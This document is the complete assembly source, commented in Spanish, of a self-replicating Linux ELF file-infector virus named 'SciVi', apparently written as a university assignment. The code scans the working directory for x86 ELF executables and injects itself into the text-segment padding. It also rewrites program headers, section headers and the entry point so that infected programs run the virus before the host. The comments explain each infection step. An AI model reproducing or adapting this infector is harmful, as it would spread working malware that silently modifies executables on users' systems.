.globl _start
   .data
         Fin: .string "Infección Exitosa\n"
         
   .text
       .equ SYSCALL , 0x80
       .equ standart_output , 1
       .equ read_and_write , 2
       .equ SEEK_SET , 0
       .equ SEEK_CUR , 1
       .equ SEEK_END , 2
       .equ sys_exit , 1
       .equ sys_read , 3
       .equ sys_write , 4
       .equ sys_open , 5
       .equ sys_close , 6
       .equ sys_lseek , 19
       .equ sys_readdir , 89
       .equ sys_getcwd , 183
       .equ PAGE_SIZE , 4096
   
       .equ RET_ADDR, -4
       .equ DIR_H, -8
       .equ FILE_D, -12
       .equ H_ENTRY_POINT, -16
       .equ INSERT_OFFSET, -20
       .equ NEW_ENTRY_POINT, -24
       .equ PH_OFF, -28
       .equ SH_OFF, -32
       .equ ELF_HEADER, -84
       .equ CWD, -256
       .equ SH_BUFFER, -4180
       .equ PH_BUFFER, -4180
       .equ BUFFER, -4180
   
   ###################################################################################################################################################
   #Priemro guardamos los registros y flags con que se carga el Host
   ###################################################################################################################################################
   _start:
       pushal
       pushfl
       call SciVi
       popfl
       popal
       movl $Host, %ecx
       jmpl *%ecx
   
   SciVi:
       movl (%esp), %eax
       pushl %ebp
       movl %esp , %ebp
   
   #Hacemos lugar en el stack
       addl $BUFFER , %esp
   
   #Guardamos la return address original:
       movl %eax , RET_ADDR(%ebp)
   
   ###################################################################################################################################################
   #Buscamos de archivos para la infección:
   ###################################################################################################################################################
   
   #Primero, obtenemos el CWD (directorio actual, Current Working Directory):
       movl $256 , %ecx      
       leal CWD(%ebp), %ebx
       movl $sys_getcwd , %eax 
       int $SYSCALL
   
   #Lo Abrimos:
       xorl %edx, %edx
       xorl %ecx, %ecx
       leal CWD(%ebp) , %ebx 
       movl $sys_open , %eax
       int $SYSCALL
   
   #Verificamos que se abrió correctamente
       testl %eax, %eax
       js Firma
   
   #Guardamos el DIR_H (handler del directorio)
       movl  %eax , DIR_H(%ebp)
       jmp Buscar_archivo
   
   Cerrar_archivo:
       movl FILE_D(%ebp) , %ebx
       movl $sys_close , %eax
       int $SYSCALL
   
   
   Buscar_archivo:
   
   #Obtenemos el siguiente archivo del directorio:
       leal -274(%ebp) , %ecx
       movl DIR_H(%ebp) , %ebx
       movl $sys_readdir , %eax
       int $SYSCALL
   
   #Comprobamos que no dio NULL (significaría que ya revisamos todos los archivos)
       testl %eax, %eax
       jz Firma
   
   #Abrimos el archivo obtenido
       movl $read_and_write , %ecx
       leal -264(%ebp) , %ebx
       movl $sys_open  , %eax
       int $SYSCALL
       testl %eax, %eax
       js Buscar_archivo
   
   #Guardamos el descriptor en FILE_D(%ebp) (que es -12(%ebp))
       movl %eax , FILE_D(%ebp)
   
   #Leemos el ELF header
       movl $52 , %edx
       leal ELF_HEADER(%ebp) , %ecx
       movl FILE_D(%ebp) , %ebx
       movl $sys_read , %eax
       int $SYSCALL
   
   
   #Verificamos que leyó correctamente:
       testl %eax, %eax
       js Cerrar_archivo
   
   ###############################################################################
   #Revisamos si el archivo abierto es un ELF ejecutable de x86
   ###############################################################################
       
   #Primera mitead del Numero magico
       movl ELF_HEADER(%ebp) , %eax
       cmpl $0x464C457F , %eax
       jnz Cerrar_archivo
   
   #segunda mitad:
       movl (ELF_HEADER + 4)(%ebp) , %eax 		
       cmpl $0x00010101 , %eax
       jnz Cerrar_archivo
   
   #e_type
       movw (ELF_HEADER + 0x10)(%ebp) , %ax 
       cmpw $0x0002 , %ax
       jnz Cerrar_archivo
   
   #Machine y version
       movl (ELF_HEADER + 0x12)(%ebp) , %eax 
       cmpl $0x00010003 , %eax
       jnz Cerrar_archivo
   
   #Verificamos que haya al menos 1 PH:
       movw (ELF_HEADER + 0x2C)(%ebp) , %cx 
       test %cx, %cx
       jz Cerrar_archivo
   
   ###############################################################################
   #En este punto tenemos abierto un archivo ELF que podemos manipular, yupi XD
   # (Sí, entregamos el TP con el "yupi XD" y todo :P)
   ###############################################################################
   
   ###############################################################################
   #Ahora debemos revisar el padding, para ver si entra el virus
   ###############################################################################
   
   #Guardamos el offset del primer PH.      
       movl (ELF_HEADER + 0x1c)(%ebp) , %eax		
       movl %eax , PH_OFF(%ebp)
   
   #Guardamos la cantidad de PH en %ecx
       xorl %ecx, %ecx
       movw (ELF_HEADER + 0x2C)(%ebp) , %cx
   
   #Guardamos el tamaño de PH en %edi
       movl (ELF_HEADER + 0x2A)(%ebp) , %edi
       andl $0x0000FFFF, %edi
   
   #Guardamos el entry point del Host
       movl (ELF_HEADER + 0x18)(%ebp) , %eax
       movl %eax , H_ENTRY_POINT(%ebp)
   
   
   ###################################################################################################################################################
   #Ahora buscamos el segmento que contenga al .text, lo haremos mirando que sea de tipo LOAD y con permisos de ejecución y lectura (el flag sería 5)
   ###################################################################################################################################################
   
   buscar_text:
       push %ecx
   
       movl $SEEK_SET , %edx 
       movl PH_OFF(%ebp) , %ecx 
       movl FILE_D(%ebp) , %ebx 
       movl $sys_lseek , %eax 
       int $SYSCALL
       
       movl $32, %edx			#Si bien el tamaño de cada entrada del PHT es un dato del ELF header (que guardamos en %edi)
   					#actualmente es de 32 bytes, y por eso usamos este $32 en la instrucción para mantener valores 
                                       #fijos en el stack y no pisar otros datos
       leal PH_BUFFER(%ebp) , %ecx 
       movl FILE_D(%ebp) , %ebx 
       movl $sys_read , %eax 
       int $SYSCALL
   
       cmpl $1 , PH_BUFFER(%ebp) 
       jne no_es_text 					
   
       cmpl $5 , (PH_BUFFER + 24)(%ebp)
       je text
   
   no_es_text:
       addl %edi , PH_OFF(%ebp) 
       popl %ecx
   loop buscar_text
   #El juego de hacer pushl y popl con %ecx es porque loop lo decrementa, 
   #pero a la vez es necesario para las llamadasa sistema, por eso en cada iteración lo guardamos y al final lo restauramos
   
   
   #si salimos del loop sin un salto a la etiqueta text es porque misteriosamente no hay text segment :S
   jmp Cerrar_archivo
   
   text:
   
   #calculamos el insert offset: Es la dirección física en el archivo del final del segmento que contiene al .text section
       movl (PH_BUFFER + 0x4)(%ebp), %ecx
       movl (PH_BUFFER + 0x10)(%ebp), %ebx
       addl %ebx, %ecx
       movl %ecx, INSERT_OFFSET(%ebp)
   
   #Calculamos el nuevo entry point
       movl (PH_BUFFER + 0x8)(%ebp) , %ecx
       addl %ebx , %ecx
       movl %ecx , NEW_ENTRY_POINT(%ebp)		#p_vaddr + p_filesz
   
   #%ecx tiene la dirección virtual del final del text segment
       andl $0x00000FFF , %ecx			#esto es (p_vaddr + p_filesz) mod PAGE_SIZE
       movl $PAGE_SIZE, %ebx
       subl %ecx , %ebx				#este es el padding en %ebx
       cmpl $(EndSciVi - _start), %ebx
       jb Cerrar_archivo				#si el tamaño de SciVi es mayor al padding no podemos infectar y cerramos el archivo
   
   ###################################################################################################################################################
   #En este punto sabemos que podemos infectar el archivo actual
   ###################################################################################################################################################
   
        
         movl (PH_BUFFER + 0x10)(%ebp) , %eax 	#ponemos en %eax el tamaño fisico del text segment
         addl $(EndSciVi - _start) , %eax		#le sumamos tamaño de SciVi
         movl %eax , (PH_BUFFER + 0x10)(%ebp)	#reemplazamos en el PH que reescribiremos
         movl %eax , (PH_BUFFER + 0x14)(%ebp) 	#reemplazamos en el PH que reescribiremos, este es el memsz (el cual es igual al p_filesz para el text segment)
   
   
         movl $SEEK_SET, %edx 
         movl PH_OFF(%ebp) , %ecx		#donde comienza el PH del text segment
         movl FILE_D(%ebp) , %ebx
         movl $sys_lseek , %eax 
         int $SYSCALL			#nos paramos en ese header
   
   #lo reescribimos por el que armamos extendiendo el memsize y filesz en el tamaño del virus
         movl $32 , %edx 			#Recordamos que $32 es el tamaño de una entrada del PHT
         leal PH_BUFFER(%ebp) , %ecx 
         movl FILE_D(%ebp) , %ebx 
         movl $sys_write , %eax 
         int $SYSCALL
   
   ###################################################################################################################################################
   /* Ahora debemos modificar los program headers que tengan un p_offset mayor o igual al NEW_ENTRY_POINT (son los que le siguen al text segment), 
   les incrementaremos el offset en PAGE_SIZE para esto tenemos que:
   	- Guardar la cantidad de program headers
   	- Ir ciclando de a uno y a los que tengan un offset que se necesite cambiar, se lo cambia
   
   Este cambio se debe a que existe una relación de congruencia entre la dirección virtual de un segmento y su offset físico con respecto al tamaño de página.
   Como debemos insertar el código del virus al final del text segment, debemos desplazar PAGE_SIZE a los segmentos que le continúan en el archivo para mantener 
   la congruencia
   */
   ###################################################################################################################################################
   
   #inicializamos PH_OFF (el byta donde comienza el PHT)
       movl (ELF_HEADER + 0x1c)(%ebp), %eax
       movl %eax, PH_OFF(%ebp)
   
   #Empieza el loop, leyendo la cantidad de PH a %ecx:
       xorl %ecx, %ecx
       movw (ELF_HEADER + 0x2C)(%ebp), %cx
   
   EntraLoopPHOFF:
       push %ecx
   
   #Leemos el program header a explorar.
       movl $SEEK_SET, %edx
       movl PH_OFF(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $32, %edx			#Nuevamente recordamos que este $32 es el tamaño de una entrada del PHT
       leal PH_BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
   
   #revisamos su offset, si hace falta lo cambiamos
       movl (PH_BUFFER + 0x4)(%ebp), %ebx
       cmpl INSERT_OFFSET(%ebp), %ebx
       jnc cambiarPHOFF
   
   siguePHOFF:
   
   #calculamos la direccion del siguiente PH
       xorl %edx, %edx
       movw (ELF_HEADER + 0x2A)(%ebp), %dx
       addl %edx, PH_OFF(%ebp)
       pop %ecx
   loop EntraLoopPHOFF
   
   jmp SaleLoopPHOFF
   
   cambiarPHOFF:
       addl $PAGE_SIZE, (PH_BUFFER + 0x4)(%ebp)
   
       movl $SEEK_SET, %edx
       movl PH_OFF(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
   #escribimos el nuevo header
       movl $32, %edx
       lea PH_BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   jmp siguePHOFF
   
   SaleLoopPHOFF:
       
   
   ###################################################################################################################################################
   /*
   	Debemos encontrar al último Section Header que corresponda al text segment (el que se carga en el final de este segmento). 
   	A este section hay que incementarle a sh_size (tamaño de la sección en memoria) el tsmaños del virus
   	Para esto leeremos de a dos section headers, y verificaremos que la vaddr del segundo sea mayor que la pedida (NEW_ENTRY_POINT), 
   	entonces modificamos el primero
   */
   ###################################################################################################################################################
   
   #inicializamos SH_OFF en la direccion del primer section header:
       movl (ELF_HEADER + 0x20)(%ebp), %eax
       movl %eax, SH_OFF(%ebp)
   
   #Guardamos en %ecx la cantidad de section headers, menos 1:
       xorl %ecx, %ecx
       movw (ELF_HEADER + 0x30)(%ebp), %cx
       decw %cx
   
   EntraLoopSHVADDR:
       push %ecx
   
   #Leemos dos section headers, a SH_BUFFER(%ebp)
       movl $SEEK_SET, %edx
       movl SH_OFF(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $0x28, %edx
       leal SH_BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
       movl $SEEK_SET, %edx
       movl SH_OFF(%ebp), %ecx
       xorl %ebx, %ebx
       movw (ELF_HEADER + 0x2E)(%ebp), %bx		#Tamaño de una entrada del SHT
       addl %ebx, %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $0x28, %edx
       leal (SH_BUFFER+0x28)(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
   /*
   Tenemos:
   
   Del primer header
      SH_BUFF(%ebp)   sh_name
      (SH_BUFF + 0x4)(%ebp)   sh_type
      (SH_BUFF + 0x8)(%ebp)   sh_flags
      (SH_BUFF + 0xC)(%ebp)   sh_addr
      (SH_BUFF + 0x10)(%ebp)   sh_offset
      (SH_BUFF + 0x14)(%ebp)   sh_size
      (SH_BUFF + 0x18)(%ebp)   sh_link
      (SH_BUFF + 0x1c)(%ebp)   sh_info
      (SH_BUFF + 0x20)(%ebp)   sh_addralign
      (SH_BUFF + 0x24)(%ebp)   sh_entsize
   
   Ademas:
      (SH_BUFF + 0x28 + 0xC)(%ebp) sh_addr del que sigue
   */
   
   #Verificamos que el siguiente SECTION HEADER empieze despues del nuevo entry:
       movl (SH_BUFFER + 0x28 + 0xC)(%ebp), %eax
       movl NEW_ENTRY_POINT(%ebp), %ebx
       cmpl %eax, %ebx
       jge ModificaSHVADDR
   
       xorl %eax, %eax
       movw (ELF_HEADER + 0x2E)(%ebp), %ax
       addl %eax, SH_OFF(%ebp)				#Movemos el offset una entrada y repetimos el bucle
       pop %ecx
   loop EntraLoopSHVADDR
       
   jmp NoModificaSHVADDR					#Esto no pasaría nunca pero por si las dudas consideramos el caso
   							#No se va a dar porque siempre hay secciones como .note .comment , etc que aparecen después del segmento
   
   ModificaSHVADDR:
       addl $(SciVi - _start), (SH_BUFFER + 014)(%ebp)	#Sumamos el tamaño del virus a este section
       addl $0x1c, SH_OFF(%ebp)
    
       movl $SEEK_SET, %edx
       movl SH_OFF(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       xorl %edx, %edx
       movw $4, %dx
       lea  (SH_BUFFER + 0x14)(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   
   NoModificaSHVADDR:
       
   
   ###################################################################################################################################################
   /*
   	Ahora debemos buscar los SH que estén despues del lugar en que estará el virus (los que estń después de la última sección que se carga en el text segment)
   	A estos SH hay que cambiarles su sh_offset por sh_offset + PAGE_SIZE
   */
   ###################################################################################################################################################
   
   #Inicializamos SH_OFF				#aclaramos que debemos hacerlo porque lo modificamos en el paso anterior
       movl (ELF_HEADER + 0x20)(%ebp), %eax
       movl %eax, SH_OFF(%ebp)
   
   #Empezamos el loop:
       xorl %ecx, %ecx
       movw (ELF_HEADER + 0x30)(%ebp), %cx		#Número de section headers
   
   EntraLoopSHOFF:
       push %ecx
   
   #Leemos el SECTION HEADER a explorar.
       movl $SEEK_SET, %edx
       movl SH_OFF(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $40, %edx				#El $40 es porque el tamaño de la especificación lo dice, también está como dato en el ELF Header
       leal SH_BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
   #revisamos su offset, si hace falta lo cambiamos
       movl (SH_BUFFER + 0x10)(%ebp), %ebx
       cmpl INSERT_OFFSET(%ebp), %ebx
       jnc CambiarSHOFF
   
   SigueLoopSHOFF:
   #Incremento SH_OFF
       xorl %eax, %eax
       movw (ELF_HEADER + 0x2E)(%ebp),  %ax
       addl %eax, SH_OFF(%ebp)
       pop %ecx
   loop EntraLoopSHOFF
   
   jmp SaleLoopSHOFF
   
   CambiarSHOFF:
      addl $PAGE_SIZE, (SH_BUFFER+0x10)(%ebp)
   
      movl $SEEK_SET, %edx
      movl SH_OFF(%ebp), %ecx
      movl FILE_D(%ebp), %ebx
      movl $sys_lseek, %eax
      int $SYSCALL
   
   #Escribimos el nuevo header
      movl $40, %edx
      leal SH_BUFFER(%ebp), %ecx
      movl FILE_D(%ebp), %ebx
      movl $sys_write, %eax
      int $SYSCALL
   
   jmp SigueLoopSHOFF
   SaleLoopSHOFF:
   
   
   ###################################################################################################################################################
   /*
   El siguiente paso es desplazar partte del archivo para poder inyectar el virus. Desplazamos lo que está después del INSERT_OFFSET
   Este bucle va corriendo el archivo de a bloques de 4096, hasta que se de una de las siguientes situaciones:
   	 inyecta1: No quedan 4096 bytes para correr en el archivo
   	 inyecta2: Ya se movió la parte que incluye al entry point
   */
   ###################################################################################################################################################
   
       movl $SEEK_END, %edx
       movl $0, %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
   #Tenemos en %eax el tamaño del archivo en bytes y estamos parados al final del archivo
   
   /*
   ­Este bucle mueve el código de a 4k para hacer lugar al virus ­revisando con inyecta1 si hay 4k para mover o si son menos
   ­Luego, inyecta2 coloca el virus en el host
   Algunas cosas deben destacarse:
   - Si todo el host tiene menos de 4k de tamaño entonces el relleno que se hace para que SciVi complete 4k estará relleno de código no usado 
   y ceros que se completan automáticamente
   - Si el host pesa más de 4k el relleno que se hace para que SciVi complete 4k es parte del programa movido, el cuál no interesa pués nunca se 
   cargará por estar fuera de los límites según el PHT
   ­- El algortimo no borra lo último que se movio, por ende no habra errores en ejecucion si se desplaza parte del text segmnet, simplemente aparecerá 
   2 veces en el archivo y no se cargará por lo explicado anteriormente
   
   RECORDAR: El desplazamiento es de a 4k (PAGE_SIZE) para mantener congruencia entre vaddr y offset
   */
   
   EntraLoopFS:
       cmpl $PAGE_SIZE, %eax
       jbe inyecta1
   
       movl $SEEK_CUR, %edx
       movl $-PAGE_SIZE, %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $PAGE_SIZE, %edx
       leal BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
       movl $PAGE_SIZE, %edx
       leal BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   
       movl $SEEK_CUR, %edx
       movl $(-2*PAGE_SIZE), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       cmpl INSERT_OFFSET(%ebp), %eax	#En %eax está el byte en que nos paramos con lseek
       jbe inyecta2
   jmp EntraLoopFS
   	
   inyecta1:
   #Situacion: No hay PAGE_SIZE bytes para copiar en el archivo, hay %eax bytes atras que queremos mover PAGE_SIZE bytes adelante:
       push %eax 			#tenemos la camtidad de bytes que quedan por mover en el archivo
   
   #Leemos esos bytes, a la dirección BUFFER(%ebp, %eax, 1)
       movl $SEEK_SET, %edx
       movl $0, %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
   
       pop %eax
   
       movl %eax, %edx
       leal BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_read, %eax
       int $SYSCALL
   
       push %eax
   
   #Y los escribimos:
       movl $SEEK_CUR, %edx
       movl $PAGE_SIZE, %ecx
       subl %eax, %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       pop %eax
   
       movl %eax, %edx
       leal BUFFER(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   
   inyecta2:
   #Situación: Ya tenemos copiado todo el archivo luego del offset PAGE_SIZE byes adelante, ahora insertamos el virus:
   
       movl $SEEK_SET, %edx
       movl INSERT_OFFSET(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $(EndSciVi - _start), %edx
       movl RET_ADDR(%ebp), %ecx
       subl $7, %ecx			#7 bytes es el tamaño del opcode que ocupan las instruccones previas a la dirección de retorno vieja
   					#EStamos situados en la dirección de _start
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   
       movl $SEEK_SET, %edx
       movl INSERT_OFFSET(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
       movl $SEEK_CUR, %edx
       movl $10, %ecx			#Al desplazarnos estos 10 bytes estamos en parados en el valor de la etiqueta Host en la instrucción "movl $Host, %ecx"
       movl FILE_D(%ebp), %ebx
       movl $sys_lseek, %eax
       int $SYSCALL
   
   #La modificamos por la del entry point que tenía el host antes de ser infectado
       movl $4, %edx
       leal H_ENTRY_POINT(%ebp), %ecx
       movl FILE_D(%ebp), %ebx
       movl $sys_write, %eax
       int $SYSCALL
   
   ###################################################################################################################################################
   #Finalmente reescribimos entry point y sh_off en el ELF Header
   ###################################################################################################################################################
   
   	addl $PAGE_SIZE, (ELF_HEADER + 0x20)(%ebp)
   	movl NEW_ENTRY_POINT(%ebp), %eax
   	movl %eax, (ELF_HEADER + 0x18)(%ebp)
   
   	movl $SEEK_SET, %edx
   	movl $0, %ecx
   	movl FILE_D(%ebp), %ebx
   	movl $sys_lseek, %eax
   	int $SYSCALL
   
   	movl $52, %edx
   	leal ELF_HEADER(%ebp), %ecx
   	movl FILE_D(%ebp), %ebx
   	movl $sys_write, %eax
   	int $SYSCALL
   
   	jmp Cerrar_archivo		#Y después de todo cerramos el archivo y buscamos el próximo
   
   #dejamos un mensaje de infección
   Firma:
         call A
         .string "Hola, mi nombre es SciVi. Soy un virus informático y vivo en este archivo\n"
   #Este truco del call es para guardar la cadena sin usar .data section en el virus
   
   A:
         popl %eax
         movl $75 , %edx
         movl %eax , %ecx
         movl $standart_output , %ebx
         movl $sys_write , %eax
         int $SYSCALL
         leave				#Este nos lleva al inicio del marco de SciVi
         ret				#Volvemos directamente al _start de SciVi para saltar al Host
         
   EndSciVi:
   
   ###################################################################################################################################
   #Esta parte no va a estar en los archivos que se infecten
   ###################################################################################################################################
   
   
   Host:
         movl $19 , %edx
         movl $Fin , %ecx
         movl $standart_output , %ebx
         movl $sys_write , %eax
         int $SYSCALL
              
         movl $0 , %ebx
         movl $sys_exit , %eax
         int $SYSCALL
   
   
   ######################################################-------- FIN --------######################################################
